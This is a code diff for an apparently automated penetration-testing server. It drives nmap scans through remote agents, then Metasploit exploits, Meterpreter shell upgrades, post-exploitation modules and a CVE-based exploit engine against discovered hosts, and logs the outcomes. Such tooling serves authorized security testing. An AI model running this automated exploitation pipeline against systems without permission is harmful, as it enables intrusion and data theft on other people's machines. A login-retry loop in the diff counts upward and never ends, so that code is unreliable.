@@ -17,7 +17,6 @@ import configparser
 import os
 import time
 from __const import FAIL, WARNING, NOTE, OK
-# from pymetasploit3.msfrpc import MsfRpcClient
 import sys
 from CannonPlug import CannonPlug
 import http.client
@@ -29,6 +28,7 @@ import re
 from bs4 import BeautifulSoup
 from urllib.parse import parse_qs
 from qlai import QLAI
+from transaction_handler import TransactionHandler
 import vulners
 DEBUG = 'DEBUG' in os.environ
 VULNERS_API_KEY = os.environ['vulners_api_key']
@@ -153,12 +153,18 @@ class UserView(FlaskView):
         if new_password == "":
             return {'status': False, "error": "Password cannot be empty."}
         return DBHANDLE.change_password(request.json['username'], new_password)
-
-    # @route('/verifypublicip', methods=['POST'])
-    # def verifypublicip(self):
-    #     if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
-    #         return {"status": False, "error": "You are not logged in to access this resource."}, 403
-    #     return DBHANDLE.verify_public_ip(request.json['username'])
+    
+    @route('/updateinfo', methods=['POST'])
+    def update_info(self):
+        if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
+            return {"status": False, "error": "You are not logged in to access this resource."}, 403
+        data = request.json
+        firstname = data.get('firstname', "")
+        lastname = data.get('lastname', "")
+        username = data.get('username', "")
+        companyname = data.get('companyname', "")
+        return DBHANDLE.change_user_info(username, firstname, lastname, companyname)
+        
 
 class ExploitView(FlaskView):
     representations = {'application/json': APIUtils.output_json}
@@ -243,6 +249,14 @@ class AgentView(FlaskView):
         if not "localip" in request.json:
             return {'success': False, 'error': "Please provide IP of Local System."}
         return DBHANDLE.get_latest_exploitation_data(request.json['username'], request.json['localip'])
+    
+    @route('/latestpostexploitlogs', methods=['POST'])
+    def get_latest_post_exploitation_logs(self):
+        if "username" not in request.json.keys():
+            return {'success': False, 'error': "You are not logged in to access this resource."}
+        if not "localip" in request.json:
+            return {'success': False, 'error': "Please provide IP of Local System."}
+        return DBHANDLE.get_latest_post_exploitation_data(request.json['username'], request.json['localip'])
 
 latest_updates = {}
 def send_status_update(username, data):
@@ -250,8 +264,6 @@ def send_status_update(username, data):
     latest_updates[username][data['system']] = data
     socketIOServer.emit("statusUpdate", room=username, data=data)
     socketIOServer.sleep(0)
-
-
 
 class FlaskAPI(Flask):
     def __init__(self):
@@ -277,45 +289,50 @@ class FlaskAPI(Flask):
         except:
             return False
 
-    # @staticmethod
-    # def check_agent_ip(username: str) -> bool:
-    #     data = DBHANDLE.get_agent_ip(username)
-    #     if not data['success']:
-    #         request.json['ipverified'] = False
-    #         return False
-    #     if request.remote_addr == data['ip'] and data['ipverified']:
-    #         request.json['ipverified'] = True
-    #         return True
-    #     request.json['ipverified'] = False
-    #     return False
-
-
-
-
 user_threads = {}
 
 def scan_all_systems(username):
     while True:
         systems: list = DBHANDLE.get_local_systems(username).get("data", None)
         print("Systems: " + str(systems))
+        first_system = True
         for system in systems:
             send_status_update(username, {"system": system, "statusText": "Started NMAP Scan", "mode": "Running"})
             nmap_response = send_command(username, data={'service': 'nmap', 'ip': system})
             print(nmap_response)
             nmap_file = nmap_response['localfile']
             nmap_file_contents = nmap_response['scandata']
+            vulners_cves = nmap_response['cves']
             agent_ip_response = send_command(username, data={'service': 'agent_ip', 'ip': system})
             if agent_ip_response['success'] == False:
                 print("No route found to target.")
                 continue
             agent_ip = agent_ip_response['agent_ip'] # "127.0.0.1"
-            msfcannon =  MetasploitCannon(agent_ip, system, username, nmap_file, nmap_file_contents)
+            if first_system:
+                tmp_client = Msgrpc({'username': username, 'host': agent_ip})
+                loggedIn = tmp_client.login("tmp", "tmp")
+                if loggedIn:
+                    sessions_list = tmp_client.get_session_list()
+                    if type(sessions_list) == dict:
+                        for sessionid, session in sessions_list.items():
+                            tmp_client.stop_session(sessionid)
+                    tmp_client.logout()
+                first_system = False
+            trans_handler = TransactionHandler(username, system)
+            msfcannon =  MetasploitCannon(agent_ip, system, username, nmap_file, nmap_file_contents, trans_handler)
             msfcannon.run()
-            msfcannon.load_post_exploit_list()
+            if DEBUG:
+                print("Metasploit Attack Complete")
+                print(str(trans_handler.scanning_event))
+            trans_handler.set_cves(vulners_cves)
+            pycannon = PySploit(username, agent_ip,system, vulners_cves, trans_handler)
+            pycannon.run()
+            trans_handler.update_db()
+            
 
 @socketIOServer.event
 def connect(sid, environ):
-    print('Environ', environ)
+    # print('Environ', environ)
     if(not (('HTTP_AUTHORIZATION' in environ) and str(environ['HTTP_AUTHORIZATION']).startswith('Bearer '))):
         socketIOServer.disconnect(sid)
     token = environ['HTTP_AUTHORIZATION'][7:]
@@ -399,9 +416,7 @@ def send_command(username, data, retries=5):
     data['request_id'] = request_id
     all_requests[request_id] = {}
     all_requests[request_id]['request'] = data
-    # print(connected_clients)
     sid = find_sid_by_username(username)
-    # print(username,data)
     if sid is False:
         return {'success': False, 'error': 'Client Disconnected', 'reason': 'Client Disconnected'}
     socketIOServer.emit('request', data, to=sid)
@@ -448,9 +463,6 @@ class Msgrpc:
         except FileExistsError as err:
             self.util.print_message(FAIL, 'File exists error: {}'.format(err))
             sys.exit(1)
-        # Common setting value.
-        # self.msgrpc_user = config['Common']['msgrpc_user']
-        # self.msgrpc_pass = config['Common']['msgrpc_pass']
 
         # Replace Above values with ones provided in options paramter
         self.msgrpc_user = option.get('username') or ""
@@ -498,59 +510,6 @@ class Msgrpc:
             self.util.print_message(FAIL, "Error from Agent: " + response['reason'])
             sys.exit()
         return response['data']
-        # if response['success'] == False:
-        #     # if response['reason'] == "auth" and meth != 'auth.login':
-        #     #     self.login(self.msgrpc_user, self.msgrpc_pass)
-        #     print(response)
-        #     exit(1)
-        # decoded_res = response['resp']
-        # resp = {}
-        # for op in decoded_res:
-        #     key = op[0]
-        #     value = op[1]
-        #     if key['type'] == "bytes":
-        #         key = bytes(key['value'], 'ascii')
-        #     else:
-        #         key = key['value']
-        #     if value['type'] == "bytes":
-        #         value = bytes(value['value'], 'ascii')
-        #     else:
-        #         value = value['value']
-        #     resp[key] = value
-            
-        # print(resp)
-        # return msgpack.packb(resp)
-        # print(option)
-        # params = msgpack.packb(option)
-        # resp = ''
-        # try:
-        #     self.client.request("POST", self.uri, params, self.headers)
-        #     resp = self.client.getresponse()
-        #     self.retry_count = 0
-        # except Exception as err:
-        #     while True:
-        #         self.retry_count += 1
-        #         if self.retry_count == self.con_retry:
-        #             self.util.print_exception(err, 'Retry count is over.')
-        #             exit(1)
-        #         else:
-        #             # Retry.
-        #             self.util.print_message(WARNING, '{}/{} Retry "{}" call. reason: {}'.format(
-        #                 self.retry_count, self.con_retry, option[0], err))
-        #             time.sleep(1.0)
-        #             if self.ssl:
-        #                 self.client = http.client.HTTPSConnection(
-        #                     self.host, self.port)
-        #             else:
-        #                 self.client = http.client.HTTPConnection(
-        #                     self.host, self.port)
-        #             if meth != 'auth.login':
-        #                 self.login(self.msgrpc_user, self.msgrpc_pass)
-        #                 option = self.set_api_option(meth, origin_option)
-        #                 self.get_console()
-        #             resp = self.send_request(meth, option, origin_option)
-        #             break
-        # return resp
 
     # Log in to RPC Server.
     def login(self, user, password):
@@ -667,6 +626,17 @@ class Msgrpc:
         ret = self.call('module.execute', [module_type, module_name, options])
         if DEBUG:
             print(module_name + str(ret))
+        if b'error' in ret and ret[b'error_code'] == 401:
+            count = 5
+            loggedin = False
+            self.authenticated = False
+            while(not loggedin)  and count > 0:
+                loggedin = self.login(self.msgrpc_user, self.msgrpc_pass)
+                if loggedin:
+                    return self.execute_module(module_type, module_name, options)
+                count += 1
+            return None
+
         try:
             job_id = ret[b'job_id']
             uuid = ret[b'uuid'].decode('utf-8')
@@ -744,7 +714,8 @@ class Msgrpc:
 
     # Get Session Compatible Modules
     def get_session_compatible_module(self, session_id):
-        ret = self.call('session.compatible_modules', [str(session_id)])
+        cmd = 'session.compatible_modules'
+        ret = self.call(cmd, [str(session_id)])
         try:
             if DEBUG:
                 print(ret)
@@ -764,6 +735,8 @@ class Msgrpc:
             return ret[b'result'].decode('utf-8')
         except Exception as e:
             self.util.print_exception(e, 'Failed: {}'.format(cmd))
+            if DEBUG:
+                print(ret)
             return 'Failed'
 
     # Get executing meterpreter result.
@@ -772,7 +745,8 @@ class Msgrpc:
         if DEBUG:
             print("Print Returned Data: " + str(ret))
         try:
-            return ret[b'data'].decode('utf-8')
+            # return ret[b'data'].decode('utf-8')
+            return ret
         except Exception as e:
             self.util.print_exception(e, 'Failed: session.meterpreter_read')
             return None
@@ -816,8 +790,7 @@ class MetasploitCannon(CannonPlug):
     loading_exploit_list = False
     loading_post_exploit_list = False
 
-    # def __init__(self, agent_ip: str, target_ip: str, username: str, password: str, nmap_file: str):
-    def __init__(self, agent_ip:str, target_ip: str, username: str, nmap_file: str, nmap_contents: str):
+    def __init__(self, agent_ip:str, target_ip: str, username: str, nmap_file: str, nmap_contents: str, trans_handler: TransactionHandler):
         self.util = Utility()
         self.rhost = target_ip
         self.nmap_file_contents = nmap_contents
@@ -830,15 +803,13 @@ class MetasploitCannon(CannonPlug):
             self.util.print_message(
                 FAIL, 'Configuration file missing. exiting...')
             sys.exit(1)
-        # server_host = config['Common']['server_host'] # replace with agent_ip
         self.agent_ip = agent_ip
         server_host = self.agent_ip
         self.username = username
 
+        self.trans_handler = trans_handler
+
         self.lhost = server_host
-        # server_port = int(config['Common']['server_port'])
-        # self.msgrpc_user = config['Common']['msgrpc_user']
-        # self.msgrpc_pass = config['Common']['msgrpc_pass']
         self.msgrpc_user = username
         self.msgrpc_pass = ""
         self.timeout = int(config['Common']['timeout'])
@@ -855,8 +826,6 @@ class MetasploitCannon(CannonPlug):
             self.data_path, config['Common']['plot_file'])
         self.port_div_symbol = config['Common']['port_div']
 
-        # Current Scanning Event
-        self.scanningevent = None
 
         # Set Metasploit option values
         self.lhost = server_host
@@ -896,70 +865,11 @@ class MetasploitCannon(CannonPlug):
 
         self.exploit_tree = {}
         self.target_tree = {}
-
-        # self.nmap_result_file = '/home/omamba/nmap_result_omamba_' + \
-        #     self.msgrpc_user + '_' + self.rhost + '.xml'
         self.nmap_result_file = nmap_file
 
-        # Pending DB Data
-        self.db_scanning_logs = {}
-        self.db_exploitation_logs = []
         self.sessions_list = []
     
-    def store_to_db(self):
-        # self.db_scanning_logs = {'openports': dict(), 'username': self.msgrpc_user, 'localip': self.rhost, 'os': "Unknown", "closed_ports": list()}
-        openPorts = self.db_scanning_logs['openports']
-        username = self.db_scanning_logs['username']
-        localip = self.db_scanning_logs['localip']
-        os = self.db_scanning_logs['os']
-        closed_ports = self.db_scanning_logs['closed_ports']
-        self.scanningevent = DBHANDLE.insert_scanning_log(openPorts, username, localip, os, closed_ports)['event']
-        if self.db_exploitation_logs != []:
-            for exploit_log in self.db_exploitation_logs:
-                username = exploit_log['username']
-                localip = exploit_log['localip']
-                exploit = exploit_log['exploit']
-                payload = exploit_log['payload']
-                port = exploit_log['port']
-                success = exploit_log['success']
-                result = exploit_log['result']
-                engine = exploit_log['engine']
-                exploit_event = DBHANDLE.insert_exploitation_log(username, localip, exploit, payload, engine, port, success, self.scanningevent)
-                result['exploit_event'] = exploit_event
-                if success == True:
-                    self.sessions_list.append(result)
-        else:
-            self.sessions_list = []
     def get_scan_info(self):
-
-        # cat_cmd = 'cat ' + self.nmap_result_file + '\n'
-        # echo_cmd= 'echo hello\n'
-        # nmap_result = ""
-        # dbl_line = 0
-        # _ = self.client.call('console.write', [self.client.console_id, echo_cmd])
-        # time.sleep(3.0)
-        # time_count = 0
-        # while True:
-        #     ret = self.client.call('console.read', [self.client.console_id])
-        #     print(ret)
-        #     try:
-        #         if self.timeout == time_count:
-        #             self.client.termination(self.client.console_id)
-        #             self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
-        #             break
-        #         nmap_result += ret.get(b'data').decode('utf-8')
-        #         status = ret.get(b'busy')
-        #         if status is False:
-        #             if(nmap_result.endswith("\n\n")) and dbl_line < 1:
-        #                 print("Ending with Double NewLine")
-        #                 dbl_line += 1
-        #                 continue
-        #             break
-        #     except Exception as e:
-        #         self.util.print_exception(e, 'Failed: console.read')
-        #     time.sleep(1.0)
-        #     time_count += 1
-        # print(nmap_result)
 
         # call get_nmap_xml_contents instead
         nmap_file_content = self.get_nmap_xml_contents()
@@ -980,6 +890,10 @@ class MetasploitCannon(CannonPlug):
                             closed_ports.append(port.attrs['portid'])
                             skip = True
                             break
+                        if ochild.attrs['state'] == "filtered":
+                            skip = True
+                            break
+
             if skip:
                 continue
 
@@ -987,19 +901,26 @@ class MetasploitCannon(CannonPlug):
             proto_list.append(port.attrs['protocol'])
             for ochild in port.contents:
                 if ochild.name == 'service':
-                    temp_info = ''
-                    if 'product' in ochild.attrs:
-                        temp_info += ochild.attrs['product'] + ' '
+                    temp_info = {
+                        'service_name': 'unknown',
+                        'version': '0.0',
+                        'extrainfo': '',
+                        'friendly_name': 'Unknown'
+                    }
+                    if 'name' in ochild.attrs:
+                        temp_info['service_name']= ochild.attrs['name']
                     if 'version' in ochild.attrs:
-                        temp_info += ochild.attrs['version'] + ' '
+                        temp_info['version'] = ochild.attrs['version']
                     if 'extrainfo' in ochild.attrs:
-                        temp_info += ochild.attrs['extrainfo']
+                        temp_info['extrainfo'] = ochild.attrs['extrainfo']
                     if 'ostype' in ochild.attrs:  # Get OS Family, Type or Name
                         os_name = ochild.attrs['ostype'].lower()
-                    if temp_info != '':
+                    if 'product' in ochild.attrs: # Get Friendly Name of Service
+                        temp_info['friendly_name'] = ochild.attrs['product']
+                    if temp_info != {}:
                         info_list.append(temp_info)
                     else:
-                        info_list.append('unknown')
+                        info_list.append(temp_info)
 
         if len(port_list) == 0:
             send_status_update(self.username, {"system": self.rhost, "statusText": "No Open Ports", "mode": "Running"})
@@ -1007,15 +928,7 @@ class MetasploitCannon(CannonPlug):
             self.client.termination(self.client.console_id)
             raise Exception("No Open Ports!")
 
-        # Get OS name from NMAP Output
-        # some_os = bs.find_all('osmatch')
-        # os_name = 'unknown'
-        # for obj_os in some_os:
-        #     for ochild in obj_os.contents:
-        #         if ochild.name == 'osclass' and 'osfamily' in ochild.attrs:
-        #             os_name = (ochild.attrs['osfamily']).lower()
-        #             break
-
+        # TODO (Enhancement) Use -O switch and get OS From There
         # Got OS Name from the Ports Data
 
         # Set OS to state
@@ -1027,9 +940,12 @@ class MetasploitCannon(CannonPlug):
 
     def execute_exploit(self, selected_payload, target, target_info):
         option = self.set_options(target_info, target, selected_payload)
+        if (target is None) or (target_info is None):
+            return None
         job_id, uuid = self.client.execute_module(
             'exploit', target_info['exploit'], option)
-
+        if (job_id is None) or (uuid is None):
+            return None
         if uuid is not None:
             status = self.check_running_module(job_id, uuid)
             if status == False:
@@ -1090,15 +1006,6 @@ class MetasploitCannon(CannonPlug):
             return None
         if DEBUG:
             print(option)
-        # job_id, uuid = self.client.execute_module(
-        #     'post', post_exploit, option)
-
-        # if uuid is not None:
-        #     status = self.check_running_module(job_id, uuid)
-        #     if status == False:
-        #         return None
-        # else:
-        #     return None
         option_string = " ".join([k + "=" + str(v) for k,v in option.items()])
         meterpreter_cmd = 'run ' + post_exploit + ' ' + option_string
         if DEBUG:
@@ -1123,12 +1030,9 @@ class MetasploitCannon(CannonPlug):
         try:
             self.get_target_info()
         except Exception as e:
-            self.store_to_db()
+            # self.store_to_db()
             self.util.print_message(FAIL, str(e))
             return
-        
-        # self.test_exploit("exploit/unix/irc/unreal_ircd_3281_backdoor", "cmd/unix/reverse_ruby", "6697", "0")
-        # return
         
         self.sessions_list = []
         keys = self.target_tree.keys()
@@ -1150,7 +1054,6 @@ class MetasploitCannon(CannonPlug):
                     NOTE, "Attacking using exploit " + exploit[8:] + "...")
                 for target in self.exploit_tree[exploit[8:]]['target_list']:
                     # payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
-                    # TODO target vs targets check key in exploit_tree.json
                     payload_list = self.exploit_tree[exploit[8:]
                                                      ]['target'][target]
                     payload_list = self.extract_osmatch_payload(payload_list)
@@ -1162,41 +1065,47 @@ class MetasploitCannon(CannonPlug):
                         self.client.keep_alive()
                         target_info = self.set_target_info(
                             key, exploit, int(target))
-                        step = ai.step(self.os_real, target_info['prod_name'], target_info['version'], target_info['port'], "Metasploit", exploit, payload)
-                        if (not step):
-                            continue # Skip if AI advised
-                        self.util.print_message(NOTE, "Target Info: {}, Target: {}, Payload: {}".format(
-                            target_info, target, payload))
                         send_status_update(self.username, {"system": self.rhost, "statusText": 'Trying to enter using ' + exploit + '(' + payload+ ') on port ' + str(key), "mode": "Running"})
+                        self.util.print_message(NOTE, 'Trying to enter using ' + exploit + '(' + payload+ ') on port ' + str(key))
+                        # step = ai.step(self.os_real, target_info['prod_name'], target_info['version'], target_info['port'], "Metasploit", exploit, payload)
+                        # if (not step):
+                        #     continue # Skip if AI advised
+                        if DEBUG:
+                            self.util.print_message(NOTE, "Target Info: {}, Target: {}, Payload: {}".format(
+                                target_info, target, payload))
                         result = self.execute_exploit(
                             payload, target, target_info)
                         if result is not None:
-                            ai.set_reward(self.os_real, target_info['prod_name'], target_info['version'], target_info['port'], "Metasploit", exploit, payload, 1)
-                            ai.save_file()
-                            exploit_log = {"username": self.msgrpc_user, "localip": self.rhost, "exploit": exploit, "payload": payload, "engine": "Metasploit", "port": str(key), "success": True, "result": result}
-                            if DEBUG:
-                                print(str(exploit_log))
-                            self.db_exploitation_logs.append(exploit_log)
+                            # Upgrade Shell
+                            self.client.upgrade_shell_session(int(result['session_id']), self.lhost, self.lport)
+                            # ai.set_reward(self.os_real, target_info['prod_name'], target_info['version'], target_info['port'], "Metasploit", exploit, payload, 1)
+                            # ai.save_file()
+                            self.trans_handler.add_exploit_event(exploit, payload, 'Metasploit', True, key, result)
+                            self.sessions_list.append(result)
                             self.util.print_message(NOTE, "Got a session")
                             send_status_update(self.username, {"system": self.rhost, "statusText": 'Got a Session using ' + exploit + '(' + payload+ ') on port ' + str(key), "mode": "Running"})
-                        else:
-                            ai.set_reward(self.os_real, target_info['prod_name'], target_info['version'], target_info['port'], "Metasploit", exploit, payload, -1)
-                            ai.save_file()
-        
-        # Store Data to DB after Exploitation is done
-        self.store_to_db()
+                        # else:
+                            # ai.set_reward(self.os_real, target_info['prod_name'], target_info['version'], target_info['port'], "Metasploit", exploit, payload, -1)
+                            # ai.save_file()
+
         if(len(self.sessions_list) == 0):
             self.util.print_message(
                 FAIL, "Got no session. Exploitation Failed...")
         else:
             self.util.print_message(
                 OK, "Bingo! Got " + str(len(self.sessions_list)) + " session(s).")
-            for session in self.sessions_list:
-                print(str(session) + "\n\n")
-                send_status_update(self.username, {"system": self.rhost, "statusText": "Starting post exploitation on Session " + str(session['session_id']), "mode": "Running"})
-                self.do_post_exploitation(session)
-                send_status_update(self.username, {"system": self.rhost, "statusText": "Terminating Session " + str(session['session_id']), "mode": "Running"})
-                self.client.stop_session(session['session_id'])
+            meterpreter_dict = {}
+            current_sessions_list = self.client.get_session_list()
+            for sessionid, session in current_sessions_list.items():
+                if session[b'type'] == b'meterpreter' and session[b'session_host'] == bytes(self.rhost, 'utf-8'):
+                    meterpreter_dict[sessionid] = session
+            print("Meterpreter Sessions " + str(meterpreter_dict))
+            for sessionid, session in meterpreter_dict.items():
+                # print(str(session_id) + "\n\n")
+                send_status_update(self.username, {"system": self.rhost, "statusText": "Starting post exploitation on Session " + str(sessionid), "mode": "Running"})
+                self.do_post_exploitation(sessionid)
+                send_status_update(self.username, {"system": self.rhost, "statusText": "Terminating Session " + str(sessionid), "mode": "Running"})
+                self.client.stop_session(sessionid)
         # print("SWITCHING TO TESTING MODE FOR POST-EXPLOITATION TESTING")
         # self.test_postexploitation()
         
@@ -1274,33 +1183,51 @@ class MetasploitCannon(CannonPlug):
                                                                                 post_exploit))
         return post_exploit_tree
 
-    def do_post_exploitation(self, session):
-        post_results = {
-            "meterpreter": False,
-            "env": "",
-            "vm": "",
-            "container": ""
-        }
-        session_id = int(session['session_id'])
-        send_status_update(self.username, {"system": self.rhost, "statusText": "Trying to upgrade shell to meterpreter", "mode": "Running"})
-        result = self.client.upgrade_shell_session(session_id, self.lhost, self.lport)
-        if DEBUG:
-            print("Session Upgrade Result " + str(result))
-        if result == 'success':
-            # Store that meterpreter shell is possible
-            send_status_update(self.username, {"system": self.rhost, "statusText": "Got Meterpreter Shell", "mode": "Running"})
-            post_results['meterpreter'] = True
-            session_id += 1
-        else:
-            # Currently returing but can do something else for non-meterpreter shell
-            send_status_update(self.username, {"system": self.rhost, "statusText": "Failed to get Meterpreter Shell", "mode": "Running"})
-            post_results['meterpreter'] = False
-        
+    def do_post_exploitation(self, session_id):
+        current_sessions = self.client.get_session_list()
+        if session_id not in current_sessions:
+            self.util.print_message(WARNING, "Meterpreter Session " + str(session_id) + " closed unexpectedly.")
+            return
+        # post_results = {
+        #     "meterpreter": False,
+        #     "env": "",
+        #     "vm": "",
+        #     "container": ""
+        # }
+        # default_session_id = int(session['session_id'])
+        # session_id = default_session_id
+        # print(str(self.client.get_session_list()))
+        # send_status_update(self.username, {"system": self.rhost, "statusText": "Trying to upgrade shell to meterpreter", "mode": "Running"})
+        # result = self.client.upgrade_shell_session(session_id, self.lhost, self.lport)
+        # if DEBUG:
+        #     print("Session Upgrade Result " + str(result))
+        # if result == 'success':
+        #     # Store that meterpreter shell is possible
+        #     send_status_update(self.username, {"system": self.rhost, "statusText": "Got Meterpreter Shell", "mode": "Running"})
+        #     post_results['meterpreter'] = True
+        #     session_id += 1
+        #     session_list = self.client.get_session_list()
+        #     wait_try = 0
+        #     while wait_try < 5 and int(session_id) not in session_list:
+        #         session_list = self.client.get_session_list()
+        #         wait_try += 1        
+        #     if wait_try >= 5:
+        #         print("Post Exploitation Unsuccessful")
+        #         print(session_list)
+        #         return
+        # else:
+        #     session_list = self.client.get_session_list()
+        #     print(session_list)
+        #     # Currently returing but can do something else for non-meterpreter shell
+        #     send_status_update(self.username, {"system": self.rhost, "statusText": "Failed to get Meterpreter Shell", "mode": "Running"})
+        #     post_results['meterpreter'] = False
+        #     return
+        # if post_results['meterpreter']:
         # Execute all possible Post Exploit Modules
         results = self.client.get_session_compatible_module(session_id)
         if results is None:
             if DEBUG:
-                print("Failed")
+                print("Failed to get any compatible Post Exploitation Modules")
         else:
             # results = map(convert_bytes_string_to_utf8_string, results)
             results = [x.decode('utf-8') for x in results]
@@ -1312,34 +1239,46 @@ class MetasploitCannon(CannonPlug):
             if DEBUG:
                 print(post_modules_options)
             for module in modules:
+                self.client.keep_alive()
+                module_err = False
                 self.util.print_message(NOTE, "Executing " + str(module))
                 options = post_modules_options[module]['options']
                 ret = self.execute_post_exploit(module, options)
-                # ret = self.client.get_meterpreter_result(session_id)
-                if DEBUG:
-                    print("Meterpreter Output: " + str(ret))
-                ret = self.client.call('session.ring_read', [session_id])
-                print("Ring Read: " + str(ret))
-                # ret = self.client.call('console.read', [self.client.console_id])
-                # print(ret)
-            # if DEBUG:
-            #     print(str(results))
-            # for postmod in results:
-            #     postmod = postmod.decode('utf-8')
-            #     self.util.print_message(NOTE, "Executing " + postmod)
-            #     result = self.client.execute_meterpreter(session_id, "run " + postmod)
-            #     if DEBUG:
-            #         print("Execute Result: " + str(result))
-            #     time.sleep(1.0)
-            #     result = self.client.get_meterpreter_result(session_id)
-            #     if DEBUG:
-            #         print("Output: " + str(result))
-        
-            
-
-            
-
-
+                if DEBUG:    
+                    print("Execution Result: " + str(ret))
+                if str(ret) != "success":
+                    self.util.print_message(WARNING, "Error executing Post Module " + module)
+                meterpreter_output:str = ""
+                while True:
+                    self.client.keep_alive()
+                    time.sleep(0.3)
+                    ret = self.client.get_meterpreter_result(session_id)
+                    if ret is None:
+                        self.util.print_message(WARNING, "Failed to execute " + module)
+                        module_err = True
+                        break
+                    elif type(ret) == dict and b'error_message' in ret:
+                        self.util.print_message(WARNING, ret[b'error_message'].decode('utf-8'))
+                        module_err = True
+                        break
+                    elif type(ret) == dict and b'data' in ret and ret[b'data'] != b'':
+                        meterpreter_output += str(ret[b'data'].decode('utf-8'))
+                    elif b'data' in ret and ret[b'data'].decode('utf-8') == "":
+                        if meterpreter_output ==  "":
+                            module_err = True
+                            break
+                        break
+                if module_err:
+                    continue
+                
+                if "::RequestError" in meterpreter_output:
+                    continue
+                if "RuntimeError" in meterpreter_output:
+                    self.util.print_message(FAIL, "Runtime Error in Metasploit. Skipping this session . . .")
+                    return
+                self.util.print_message(NOTE, "Output from Meterpreter . . . ")
+                print(meterpreter_output)
+                self.trans_handler.add_post_exploit_event(module, True, meterpreter_output, 'Metasploit')
 
     def test_exploit(self, exploit, payload, port, target):
         target_info = self.set_target_info(port, exploit, target)
@@ -1431,24 +1370,9 @@ class MetasploitCannon(CannonPlug):
                         return False # Don't Execute if all values are not filled
                     else:
                         option[key] = options[key]['user_specify']
-            # Set target path/uri/dir etc.
-            # if len([s for s in self.path_collection if s in key.lower()]) != 0:
-            #     option[key] = target_info['target_path']
-
-        # option['RHOST'] = self.rhost
-        # if self.port_div_symbol in target_info['port']:
-        #     tmp_port = target_info['port'].split(self.port_div_symbol)
-        #     option['RPORT'] = int(tmp_port[0])
-        # else:
-        #     option['RPORT'] = int(target_info['port'])
-
-        # option['TARGET'] = int(target)
-
-        # if selected_payload != '':
-        #     option['PAYLOAD'] = selected_payload
         option['LPORT'] = self.lport
         option['LHOST'] = self.lhost
-        option['RHOSTS'] = self.agent_ip
+        option['RHOSTS'] = self.rhost
         if DEBUG:
             print(option)
         return option
@@ -1725,7 +1649,6 @@ class MetasploitCannon(CannonPlug):
 
     def get_nmap_xml_contents(self):
         return self.nmap_file_contents
-        # TODO Use cat command and MsfRPC API to get File Contents
 
     def get_target_info(self):
         port_list, proto_list, port_info, closed_ports = None, None, None, None
@@ -1733,53 +1656,51 @@ class MetasploitCannon(CannonPlug):
             port_list, proto_list, port_info, closed_ports = self.get_scan_info()
         except Exception as e:
             # Insert these logs after Exploitation
-            # DBHANDLE.insert_scanning_log(dict(), self.msgrpc_user, self.rhost, "Unknown", list())
-            self.db_scanning_logs = {'openports': dict(), 'username': self.msgrpc_user, 'localip': self.rhost, 'os': "Unknown", "closed_ports": list()}
-            self.db_exploitation_logs = []
+            self.trans_handler.set_open_ports(dict())
+            self.trans_handler.set_closed_ports(list())
+            self.trans_handler.set_os("unknown")
+            self.trans_handler.clear_exploit_events()
+            self.sessions_list = []
+            
             self.util.print_message(FAIL, str(e))
             raise e
         target_tree = {'rhost': self.rhost, 'os_type': self.os_real}
 
-        # if os.path.exists(os.path.join(self.data_path, 'target_info_' + self.rhost + '.json')) is not False:
-        #     # Get target host information from local file.
-        #     saved_file = os.path.join(self.data_path, 'target_info_' + self.rhost + '.json')
-        #     self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
-        #     fin = codecs.open(saved_file, 'r', 'utf-8')
-        #     target_tree = json.loads(fin.read().replace('\0', ''))
-        #     fin.close()
-        #     self.target_tree = target_tree
-        #     return
-
         for port_idx, port_num in enumerate(port_list):
-            temp_tree = {'prod_name': '', 'version': 0.0,
-                         'protocol': '', 'target_path': '', 'exploit': []}
+            temp_tree = {'prod_name': '', 'version': 0.0, 
+                         'protocol': '', 'target_path': '', 'exploit': [], 'friendly_name': ''}
 
             # Get Product Name
-            service_name = 'unknown'
+            service_name = port_info[port_idx]['service_name']
+
+            # Get Product's Friendly Name
+            temp_tree['friendly_name'] = port_info[port_idx]['friendly_name']
+
             for(idx, service) in enumerate(self.service_list):
-                if service in port_info[port_idx].lower():
+                if service in port_info[port_idx]['friendly_name'].lower():
                     service_name = service
                     break
             temp_tree['prod_name'] = service_name
 
             # Get Product Version
-            regex_list = [r'.*\s(\d{1,3}\.\d{1,3}\.\d{1,3}).*',
-                          r'.*\s[a-z]?(\d{1,3}\.\d{1,3}[a-z]\d{1,3}).*',
-                          r'.*\s[\w]?(\d{1,3}\.\d{1,3}\.\d[a-z]{1,3}).*',
-                          r'.*\s[a-z]?(\d\.\d).*',
-                          r'.*\s(\d\.[xX|\*]).*']
+            regex_list = [r'(\d{1,3}\.\d{1,3}[\.\d{1,3}]+)',
+                          r'[a-z]?(\d{1,3}\.\d{1,3}[a-z]\d{1,3})',
+                          r'[\w]?(\d{1,3}\.\d{1,3}\.\d[a-z]{1,3})',
+                          r'[a-z]?(\d\.\d)',
+                          r'(\d\.[xX|\*])']
+            
+            version_str = port_info[port_idx]['version']
 
-            version = 0.0
-            output_version = 0.0
-
+            version = '0.0'
+            output_version = '0.0'
             for(idx, regex) in enumerate(regex_list):
-                version_raw = self.cutting_strings(regex, port_info[port_idx])
+                version_raw = re.findall(regex, version_str)
                 if len(version_raw) == 0:
                     continue
                 if idx == 0:
-                    index = version_raw[0].rfind('.')
+                    index = version_raw[0].find('.')
                     version = version_raw[0][:index] + \
-                        version_raw[0][index + 1:]
+                        "." + version_raw[0][index + 1:].replace(".", "")
                     output_version = version_raw[0]
                     break
                 elif idx == 1:
@@ -1809,6 +1730,7 @@ class MetasploitCannon(CannonPlug):
                         'X', '0').replace('x', '0').replace('*', '0')
                     version = version[0]
                     output_version = version_raw[0]
+
             temp_tree['version'] = float(version)
 
             # Get Protocol Type
@@ -1928,36 +1850,36 @@ class MetasploitCannon(CannonPlug):
     def extract_osmatch_payload(self, payload_list):
         os_match_payloads = []
         for payload in payload_list:
-            tokens = set(payload.split('/'))
-            if self.os_real == 0 and tokens & set(['windows', 'multi']):
+            tokens = payload.split('/')
+            if self.os_real == 0 and tokens[1] in set(['windows', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 1 and tokens & set(['unix', 'freebsd', 'bsdi', 'linux', 'multi']):
+            elif self.os_real == 1 and tokens[1] in set(['unix', 'freebsd', 'bsdi', 'linux', 'multi']):
                 os_match_payloads.append(payload)
-            elif self.os_real == 2 and tokens & set(['solaris', 'unix', 'multi']):
